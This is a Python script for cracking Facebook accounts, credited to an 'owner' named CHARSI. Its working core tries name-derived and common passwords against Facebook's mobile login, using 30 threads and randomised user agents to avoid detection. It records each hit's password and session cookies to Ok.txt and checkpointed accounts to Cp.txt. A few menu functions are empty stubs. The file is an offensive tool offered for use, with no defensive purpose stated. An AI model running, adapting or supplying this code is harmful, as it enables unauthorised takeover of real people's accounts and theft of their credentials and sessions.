#CODING BY UTF-8
#AlpinCompiler
#Owner: CHARSI

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

import os, sys, time, re, json, requests, bs4, random, calendar, datetime, subprocess, logging
from concurrent.futures import ThreadPoolExecutor as khamdihiXD

from datetime import datetime
from bs4 import BeautifulSoup as parser
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # NORMAL
J = '\033[38;2;255;127;0;1m' # ORANGE

user, mi, status_foll, cr, ok, cp, id, loop, looping = [], [], [], [], [], [], [], 0, 1
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
waktu = '%s-%s-%s'%(ha,op,ta)

# --- NEW USER AGENTS (CHARSI SPECIAL) ---
ugen = []
for x in range(2000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14'])
    c='K'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,125)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uagent=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uagent)

# --- BANNER SECTION ---
def banner():
    os.system('clear')
    print(f"""{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â•šâ• â• â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â• â• â• â• â• â• â•šâ• â• 
           {O}[ OWNER : CHARSI ]{N}
""")

def menu():
    banner()
    print(f" {H}[01] File Cloning (File Crack)")
    print(f" {H}[02] Public Cloning")
    print(f" {H}[03] Check Results OK/CP")
    print(f" {H}[00] Exit")
    print(f" {P}--------------------------------------------------")
    opt = input(f" {P}[?] Choose Option: ")
    if opt in ['1','01']:
        file_crack()
    elif opt in ['2','02']:
        public_crack()
    elif opt in ['3','03']:
        results()
    else:
        exit()

def file_crack():
    banner()
    print(f" {H}[+] Put File Path (e.g: /sdcard/ids.txt)")
    file = input(f" {P}[?] File Path: ")
    try:
        ids = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f" {M}[!] File Not Found!"); time.sleep(2); menu()
    
    print(f" {H}[+] Total IDs: {len(ids)}")
    print(f" {P}--------------------------------------------------")
    
    with khamdihiXD(max_workers=30) as charsi_pool:
        for user in ids:
            try:
                uid, name = user.split('|')
            except:
                uid = user; name = "Facebook User"
            
            pwx = [name, name+'123', name+'1234', name+'12345', '786786', 'pakistan']
            charsi_pool.submit(cloning_system, uid, pwx, len(ids))
    
    print(f"\n {P}--------------------------------------------------")
    print(f" {H}[+] Crack Completed. OK: {len(ok)} CP: {len(cp)}")
    exit()

def cloning_system(user, pwx, total):
    global loop, ok, cp
    sys.stdout.write(f'\r {P}[CHARSI] {loop}/{total} OK:{H}{len(ok)} {P}CP:{K}{len(cp)} '); sys.stdout.flush()
    for pw in pwx:
        try:
            ua = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get(f'https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":user,
                "pass":pw,
                "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
                'method': 'POST',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mbasic.facebook.com',
                'referer': 'https://mbasic.facebook.com/',
                'user-agent': ua}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f'\r {H}â•šâ• â• â• â—¨ [CHARSI-OK] {user} | {pw}{N}')
                ok.append(user)
                open('Ok.txt', 'a').write(f'{user}|{pw}|{coki}\n')
                break
            elif 'checkpoint' in log_cookies:
                print(f'\r {K}â•šâ• â• â• â—§ [CHARSI-CP] {user} | {pw}{N}')
                cp.append(user)
                open('Cp.txt', 'a').write(f'{user}|{pw}\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(10)
    loop += 1

# --- Baki function jo file me thay wo yahan se start hotay hain ---
def public_crack():
    # Aapka existing public crack logic yahan ayega
    pass

def results():
    print(f" {H}[1] Check OK Results")
    print(f" {K}[2] Check CP Results")
    # Result check logic...

if __name__ == '__main__':
    menu()
